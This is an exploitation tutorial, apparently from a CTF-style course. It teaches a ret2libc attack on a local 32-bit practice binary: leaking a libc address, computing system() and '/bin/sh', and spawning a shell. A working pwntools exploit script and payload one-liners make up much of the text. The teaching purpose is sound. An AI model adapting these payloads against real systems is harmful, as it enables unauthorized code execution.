# Pay your local library a visit

At this point you're probably used to hunting through binaries for useful functions or code that you can use to get a shell. But what do you do without a call to `system()`?

The simple answer: get a shell anyways. :)

The long answer is a bit more complicated. This attack is called a "Return to `libc`", or `ret2libc` for short. If you don't remember the PLT and GOT from before, now is a good time to check the [glossary](../terms) and maybe do some googling. You'll recall that ASLR randomizes the libc address, but the good news is that with arbitrary `read()` and `write()` calls, you can easily circumvent this.

This binary has what we call Dynamic Input, which is some super fancy ego-inflating jargon that means we can change inputs in the same program. Basically any program where you can trigger the vulnerability twice (or more) with different exploits in the same run is dynamic. If it still doesn't make sense, just stay tuned.

If you haven't already, run through [Exercise 3.5: Intro to pwntools](../exercise-3.5)

Seriously, go do that.

Now that you've made it this far, I'll give a brief overview of this style of exploit. The libc functions that the PLT stubs call aren't just some magical ethereal functions. They're real and they're mapped to a real page in memory with an address that you can call if you're clever. **The entire libc is in the binary.** From here, we exploit the fact that truly randomizing everything is computationally expensive. Instead, ASLR only randomizes the **base address** of the libc. This means that `&function_1 - &function_2` is constant as long as you're using the same libc file. With this in mind, the goal is to leak (`write()`) the address of some libc function to stdout. we then take that address, compute the address of system, call `main()` (or whatever function contains the vulnerability) again, and call `system()` with the newly computed address.

Still confused? I was when I first learned this, but I'll try to explain as I go.

First, we have to calculate the offset of `%eip`

```shell
$ python -c 'print "A"*140 + "BBBB"' | strace ./exercise-4
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```

After `140 bytes`, we have `%eip`

From here, we need to leak the address of a `libc` function.

We can do this by calling `write(1, &function, 4)`

I'll be using the GOT address of `read()` (remember that the GOT is an array of pointers into libc)

```objdump
$ objdump -d exercise-4 | grep ">:a"
...
08048370 <write@plt>:
...

$ objdump -R exercise-4
...
0804a00c R_386_JUMP_SLOT   read
...
```

With these addresses, we get the following exploit.

```shell
python -c 'print "A"*140 + "\x70\x83\x04\x08" + "RETN" +
"\x01\x00\x00\x00"+ "\x0c\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./exercise-4
```

If you go ahead and run this a few times, you'll get some weird outputs:

```shell
�+o�Segmentation fault (core dumped)
�kh�Segmentation fault (core dumped)
��n�Segmentation fault (core dumped)
```

The four bytes before the SEGFAULT are the libc address.

From here, we're going to run:

```shell
$ ldd exercise-4
    linux-gate.so.1 =>  (0xf76f9000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf753c000)
    /lib/ld-linux.so.2 (0xf76fa000)
```

Since this is a local binary challenge, the `libc` file is just going to be whatever the standard one is on your computer. **The same binary running on a different machine could have a different `libc`, and therefore give you different results.**

All we have to do is grab a copy of that `libc` and put it in our directory. If you ever exploit a remote binary and you don't have the `libc`, there are plenty of places you can get them online.

```shell
$ cp /lib/i386-linux-gnu/libc.so.6 ./
```

Now we need `pwntools`.

We'll start our script off with the typical items:

```Python
from pwn import *
context(arch='i386', os='linux') # <-- Add the architecture and os
binary = ELF("exercise-4")
libc = ELF("libc.so.6")

r = process("./exercise-4")
```

After this, we know we'll need the `read()`, `write()`, the GOT address of `read()`, and a `pop; ret` ropgadget, so we add these in.

```python
write_plt = p32(binary.symbols["write"])
read_GOT = p32(binary.symbols["got.read"])
read_plt = p32(binary.symbols["read"])
bss_addr = p32(binary.symbols["__bss_start"])
pop_ret = "\x9d\x85\x04\x08"
```

Now the binary outputs a line first, so we add:

```python
r.recvline()
```

Now we should start building our exploit. We want to try to avoid using the escape strings from before, it makes for nicer code and forces you to use `pwntools` the right way.

```python
exploit = "A"*140                                               # EIP offset
exploit += write_plt +pop_ret +  p32(1)+ read_GOT + p32(4)      # Call to write()
exploit += p32(binary.symbols["main"])                          # Call main() again to retrigger the vulnerability

```

Now we want to send the first payload:

```python
r.sendline(exploit)
```

Now here's the cool part. Since we know that the program prints out the address of `read()` in the `libc` (remember those funky bytes from earlier before the SEGFAULT?) we can take those and calculate the base address of `libc`. This indirectly means that we can call any function in the standard library.

```python
addr_read = int(r.recv(4)[::-1].encode("hex"),16)
r.recvline()
libc_base = addr_read - libc.symbols["read"]
system = p32(libc_base + libc.symbols["system"])
```

Let's break down my hacky `addr_read` line.

1. `recv()` 4 bytes from `r`
2. Reverses the remaining bytes (because of little endian encoding)  and converts them to hex
3. Parse that as an integer.

Voila! We now have the address of `read()` in `libc`.

From there, we subtract `read()`s address in the regular libc, giving us the base address for this runtime. In the last line, we add the offset of `system()` in the libc to our calculated base. This gives us the address of system for this runtime.

The best part of this whole show is that the pesky `"/bin/sh"` string we need is in `libc`! We can calculate the address of that as well!

```python
binsh = p32(libc_base +  libc.search("/bin/sh").next())
```

Now all we've got to do is send our exploit with some extra padding (it was 140 before, but now it's 148 since we overflow from before the stack frame) and we get a shell.

```python
r.sendline("A"*148+ system + "RETN" + binsh + binsh) # <- 148?????? why 148?
r.interactive()
```
